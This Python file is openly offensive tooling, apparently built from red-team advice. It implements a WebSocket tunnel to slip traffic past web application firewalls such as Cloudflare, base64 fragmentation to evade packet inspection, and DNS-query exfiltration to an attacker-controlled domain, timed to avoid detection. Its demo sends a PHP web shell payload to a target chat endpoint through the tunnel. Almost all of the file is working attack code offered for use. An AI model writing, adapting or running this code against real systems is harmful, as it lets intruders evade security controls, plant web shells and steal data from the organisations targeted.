"""
WebSocket Tunnel Bypass - Evade WAF inspection.

From Red Team Interview:
"WAFs are great at inspecting HTTP POST requests but terrible at
inspecting WebSocket streams because buffering kills performance.
They often just scan the handshake and let traffic flow."

Use Cases:
1. Bypass Cloudflare WAF inspection
2. Maintain persistent connections through firewalls
3. Exfiltrate data through "chat" channels
"""

import asyncio
import base64
from collections.abc import Callable
from dataclasses import dataclass


@dataclass
class TunnelConfig:
    """Configuration for WebSocket tunnel."""
    endpoint: str
    headers: dict = None
    chunk_size: int = 4096
    encode_payload: bool = True
    timeout: float = 30.0


class WebSocketTunnel:
    """
    Establish a WebSocket connection to bypass HTTP-layer WAF inspection.

    Strategy:
    1. Initiate standard WebSocket upgrade (looks like chat app)
    2. WAF approves handshake (Status 101)
    3. WAF "steps back" to reduce latency
    4. Stream payload through open pipe
    """

    def __init__(self, config: TunnelConfig):
        self.config = config
        self.websocket = None
        self.connected = False

    async def connect(self) -> bool:
        """
        Establish WebSocket connection.
        The WAF sees: "Just a websocket connection. Allowed."
        """
        try:
            import websockets

            headers = self.config.headers or {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
                "Origin": self.config.endpoint.replace("wss://", "https://").replace("ws://", "http://"),
            }

            self.websocket = await asyncio.wait_for(
                websockets.connect(
                    self.config.endpoint,
                    extra_headers=headers,
                    ping_interval=20,
                    ping_timeout=10
                ),
                timeout=self.config.timeout
            )
            self.connected = True
            return True

        except ImportError:
            print("[!] websockets library required: pip install websockets")
            return False
        except Exception as e:
            print(f"[!] WebSocket connection failed: {e}")
            return False

    async def send_payload(self, data: bytes | str) -> bool:
        """
        Send payload through established tunnel.

        The WAF treats it as opaque stream data and lets it through.
        """
        if not self.connected or not self.websocket:
            return False

        try:
            # Encode if configured (extra obfuscation)
            if self.config.encode_payload:
                if isinstance(data, str):
                    data = data.encode('utf-8')
                payload = base64.b64encode(data)
            else:
                payload = data

            # Send as binary (harder for WAF to inspect)
            await self.websocket.send(payload)
            return True

        except Exception as e:
            print(f"[!] Send failed: {e}")
            return False

    async def receive(self, timeout: float = 10.0) -> bytes | None:
        """Receive response from tunnel."""
        if not self.connected or not self.websocket:
            return None

        try:
            response = await asyncio.wait_for(
                self.websocket.recv(),
                timeout=timeout
            )

            # Decode if we encoded
            if self.config.encode_payload and isinstance(response, bytes):
                return base64.b64decode(response)

            return response.encode() if isinstance(response, str) else response

        except asyncio.TimeoutError:
            return None
        except Exception as e:
            print(f"[!] Receive failed: {e}")
            return None

    async def close(self):
        """Close tunnel gracefully."""
        if self.websocket:
            await self.websocket.close()
            self.connected = False

    async def __aenter__(self):
        await self.connect()
        return self

    async def __aexit__(self, *args):
        await self.close()


class ChunkedPayloadDelivery:
    """
    Bypass Deep Packet Inspection via fragmentation.

    From Red Team Interview:
    "Don't send the weapon through the tunnel; send the PARTS
    and assemble them on the other side."

    Strategy:
    1. Base64 encode payload (becomes random text)
    2. Chop into tiny pieces
    3. Send each piece as harmless data
    4. Reassemble on target
    """

    def __init__(self, chunk_size: int = 500):
        self.chunk_size = chunk_size

    def fragment(self, payload: bytes | str) -> list[str]:
        """
        Fragment payload into WAF-safe chunks.

        Each chunk looks like random text, not code.
        """
        if isinstance(payload, str):
            payload = payload.encode('utf-8')

        # Base64 encode - now it's just letters/numbers
        encoded = base64.b64encode(payload).decode('ascii')

        # Chop into chunks
        chunks = [
            encoded[i:i + self.chunk_size]
            for i in range(0, len(encoded), self.chunk_size)
        ]

        return chunks

    def reassemble(self, chunks: list[str]) -> bytes:
        """Reassemble fragments back into payload."""
        combined = ''.join(chunks)
        return base64.b64decode(combined)

    def create_delivery_sequence(
        self,
        payload: bytes | str,
        wrapper_func: Callable[[str, int], dict]
    ) -> list[dict]:
        """
        Create a sequence of "innocent" requests.

        wrapper_func should return a dict that looks like normal API traffic.
        Example: lambda chunk, idx: {"user_id": 101, "bio_part": chunk, "chunk_id": idx}
        """
        chunks = self.fragment(payload)
        return [wrapper_func(chunk, idx) for idx, chunk in enumerate(chunks)]


class DNSTunnel:
    """
    DNS Tunneling for data exfiltration.

    From Red Team Interview:
    "Firewalls almost never block DNS queries because the server
    breaks if it can't resolve names. My DNS server logs your
    server's queries, reassembles the base64, and I have your file."

    Use case: Backup exfiltration when HTTP is blocked.
    """

    def __init__(self, domain: str, chunk_size: int = 50):
        """
        Args:
            domain: Your controlled domain (e.g., "data.attacker.com")
            chunk_size: Max subdomain length (DNS limit ~63 chars per label)
        """
        self.domain = domain
        self.chunk_size = chunk_size

    def encode_to_queries(self, data: bytes | str) -> list[str]:
        """
        Encode data into DNS query format.

        Creates queries like:
          a8f7.data.attacker.com
          b9d2.data.attacker.com
        """
        if isinstance(data, str):
            data = data.encode('utf-8')

        # Base64 and make DNS-safe (replace + and / with - and _)
        encoded = base64.b64encode(data).decode('ascii')
        encoded = encoded.replace('+', '-').replace('/', '_').replace('=', '')

        # Chunk into subdomain-sized pieces
        chunks = [
            encoded[i:i + self.chunk_size]
            for i in range(0, len(encoded), self.chunk_size)
        ]

        # Create full DNS queries with sequence numbers
        queries = [
            f"{idx:04x}.{chunk}.{self.domain}"
            for idx, chunk in enumerate(chunks)
        ]

        return queries

    def decode_from_queries(self, queries: list[str]) -> bytes:
        """Decode data from DNS queries (for receiving end)."""
        # Sort by sequence number
        sorted_queries = sorted(queries, key=lambda q: int(q.split('.')[0], 16))

        # Extract chunks
        chunks = [q.split('.')[1] for q in sorted_queries]

        # Reconstruct
        encoded = ''.join(chunks)
        encoded = encoded.replace('-', '+').replace('_', '/')

        # Add padding if needed
        padding = 4 - len(encoded) % 4
        if padding != 4:
            encoded += '=' * padding

        return base64.b64decode(encoded)

    async def exfiltrate(self, data: bytes | str, resolver: str = "8.8.8.8"):
        """
        Exfiltrate data via DNS queries.

        Your DNS server logs the queries, you reassemble the data.
        """
        import socket

        queries = self.encode_to_queries(data)
        print(f"[*] Exfiltrating via {len(queries)} DNS queries...")

        for query in queries:
            try:
                # This just makes the query - your DNS server logs it
                socket.gethostbyname(query)
            except socket.gaierror:
                # Expected - the domain doesn't actually resolve
                pass

            # Small delay to avoid detection
            await asyncio.sleep(0.1)

        return len(queries)


# Example usage
async def demo_websocket_bypass():
    """Demo: Bypass WAF via WebSocket tunnel."""
    config = TunnelConfig(
        endpoint="wss://target.com/chat",
        encode_payload=True
    )

    async with WebSocketTunnel(config) as tunnel:
        if tunnel.connected:
            # Send payload through "chat" connection
            payload = b"<?php system($_GET['cmd']); ?>"
            await tunnel.send_payload(payload)
            response = await tunnel.receive()
            print(f"Response: {response}")


def demo_chunked_delivery():
    """Demo: Fragment payload to bypass DPI."""
    chunker = ChunkedPayloadDelivery(chunk_size=100)

    # Original payload (would be blocked)
    payload = "<?php system($_GET['cmd']); ?>"

    # Fragment into innocent-looking chunks
    chunks = chunker.fragment(payload)
    print(f"Fragmented into {len(chunks)} chunks:")
    for i, chunk in enumerate(chunks):
        print(f"  [{i}]: {chunk[:30]}...")

    # Reassemble (on target side)
    reassembled = chunker.reassemble(chunks)
    print(f"\nReassembled: {reassembled.decode()}")


if __name__ == "__main__":
    print("=== Chunked Delivery Demo ===")
    demo_chunked_delivery()
